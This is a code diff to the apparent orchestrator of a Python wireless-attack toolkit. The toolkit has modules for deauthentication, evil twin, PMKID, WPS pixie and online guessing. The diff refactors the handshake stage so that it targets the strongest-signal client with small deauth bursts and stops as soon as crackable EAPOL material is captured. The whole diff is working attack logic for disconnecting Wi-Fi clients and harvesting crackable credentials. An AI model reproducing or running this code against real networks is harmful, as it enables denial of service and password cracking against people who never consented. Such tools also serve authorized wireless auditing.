@@ -29,6 +29,7 @@ from .attacks.deauth import deauth as _default_deauth
 from .attacks.eviltwin import run_eviltwin as _default_eviltwin
 from .attacks.handshake import HandshakeCapture, HandshakeStatus
 from .attacks.handshake import capture_handshake as _default_capture_handshake
+from .attacks.logic import run_deauth_flow, select_client
 from .attacks.online import online_guess as _default_online_guess
 from .attacks.pmkid import capture_pmkid as _default_capture_pmkid
 from .attacks.wps import pixie_attempt as _default_pixie_attempt
@@ -82,6 +83,7 @@ class OmniOrchestrator:
 
     HANDSHAKE_MAX_ROUNDS = 6
     HANDSHAKE_ROUND_INTERVAL = 15.0
+    HANDSHAKE_BURST_SIZE = 4  # frames/round -- see attacks/logic.py's DEFAULT_BURST_SIZE
 
     def __init__(
         self,
@@ -99,6 +101,7 @@ class OmniOrchestrator:
         stop_event: threading.Event | None = None,
         handshake_max_rounds: int | None = None,
         handshake_round_interval: float | None = None,
+        handshake_burst_size: int | None = None,
         listener_settle: float = 2.0,
         online_max_attempts: int | None = 25,
         progress_fn=None,
@@ -127,6 +130,7 @@ class OmniOrchestrator:
         self._stop = stop_event or threading.Event()
         self.handshake_max_rounds = handshake_max_rounds or self.HANDSHAKE_MAX_ROUNDS
         self.handshake_round_interval = handshake_round_interval or self.HANDSHAKE_ROUND_INTERVAL
+        self.handshake_burst_size = handshake_burst_size or self.HANDSHAKE_BURST_SIZE
         self._listener_settle = listener_settle
         # "Budgeted" per the module docstring/roadmap -- online guessing is
         # a slow, noisy last resort (one live association + 4-way handshake
@@ -312,7 +316,15 @@ class OmniOrchestrator:
         return False
 
     def _stage_handshake(self, ap: AccessPoint, report: OmniReport) -> HandshakeStatus:
-        """Deauth rounds (64-frame bursts, 15s pacing) with a capture gate.
+        """Deauth rounds (small bursts, paced, stopping the moment ANY
+        crackable material appears) with a capture gate.
+
+        Client targeting and round pacing live in attacks/logic.py
+        (select_client / run_deauth_flow) rather than inline here: the
+        strongest-signal known client is targeted, in bursts well below
+        deauth()'s 64-frame default, and the loop exits as soon as the
+        live HandshakeCapture holds CHALLENGE or AUTHORIZED material
+        instead of always running the full round budget.
 
         Skipped outright when PMF is required (802.11w drops the deauths,
         so there's no point attempting the stage at all).
@@ -324,38 +336,58 @@ class OmniOrchestrator:
             return HandshakeStatus.NONE
 
         outfile = str(self.capture_dir / f"{ap.bssid.replace(':', '')}.pcap")
+        # Created up front and handed into the sniffer so run_deauth_flow can
+        # poll it live, round to round -- handshake_fn only RETURNS its own
+        # HandshakeCapture once the whole listen window ends, which is too
+        # late to skip rounds after material has already shown up.
+        live_cap = HandshakeCapture()
         result: dict[str, HandshakeCapture] = {}
+        total_window = self.handshake_max_rounds * self.handshake_round_interval + 10.0
 
         def run_capture() -> None:
-            total_window = self.handshake_max_rounds * self.handshake_round_interval + 10.0
             result["cap"] = self._handshake_fn(
                 self.iface, ap.bssid, channel=ap.channel, timeout=total_window, outfile=outfile,
-                stop_event=self._stop, progress_fn=self._log,
+                stop_event=self._stop, progress_fn=self._log, cap=live_cap,
             )
 
         listener = threading.Thread(target=run_capture)
         listener.start()
         time.sleep(self._listener_settle)  # let the sniffer settle before the first burst
 
-        client = next(iter(ap.clients), BROADCAST)
-        for round_no in range(1, self.handshake_max_rounds + 1):
-            if self._stop.is_set():
-                break
-            cap = result.get("cap")
-            if cap is not None and any(
-                cap.authorized(a, c) for a, c in cap.messages
-            ):
-                break
-            sent = self._deauth_fn(self.iface, ap.bssid, client=client, channel=ap.channel, progress_fn=self._log)
-            if sent == 0:
-                self._log(f"handshake round {round_no}/{self.handshake_max_rounds}: deauth did NOT go out to {client} — see the warning above")
-            else:
-                self._log(f"handshake round {round_no}/{self.handshake_max_rounds}: sent {sent} deauth frame(s) to {client}")
-            if self._stop.wait(self.handshake_round_interval):
-                break
+        client = select_client(ap)
+        run_deauth_flow(
+            self._deauth_fn, self.iface, ap, client, live_cap,
+            max_rounds=self.handshake_max_rounds,
+            round_interval=self.handshake_round_interval,
+            burst_size=self.handshake_burst_size,
+            stop_event=self._stop,
+            progress_fn=self._log,
+        )
 
-        listener.join(timeout=self.handshake_round_interval + 15.0)
+        # Wait out the FULL listen window here, not just the deauth round
+        # budget consumed so far -- run_deauth_flow can (and, for
+        # CHALLENGE-only material, normally does) stop sending deauth well
+        # before capture_handshake()'s own internal stop_filter fires (that
+        # only triggers on full AUTHORIZED, matching HandshakeCapture's own
+        # "CHALLENGE-only must NOT stop auto-deauth loops" rule), so the
+        # listener keeps passively running for the rest of total_window
+        # regardless of how early the deauth side gave up. Joining on only
+        # the elapsed round budget (2026-09-12 code-review finding) left a
+        # real gap: the listener thread was often still alive, hadn't
+        # written result["cap"] yet, and the code below fell through to
+        # "no EAPOL captured" -- silently discarding real, already-verified
+        # CHALLENGE material sitting in live_cap the whole time, on top of
+        # leaving an orphaned socket/thread on self.iface while the
+        # orchestrator moved on to stages that also need that interface.
+        listener.join(timeout=total_window + 15.0)
+        # Prefer the thread's actual return value (what the existing tests'
+        # handshake_fn fakes provide), but fall back to live_cap -- the same
+        # object for the real capture_handshake() -- if join() still somehow
+        # timed out without result["cap"] ever being set, rather than
+        # discarding material we know is already sitting there.
         cap = result.get("cap")
+        if cap is None:
+            cap = live_cap
         if cap is None or not cap.messages:
             report.stages.append(StageReport("handshake", StageResult.FAILED, "no EAPOL captured"))
             return HandshakeStatus.NONE
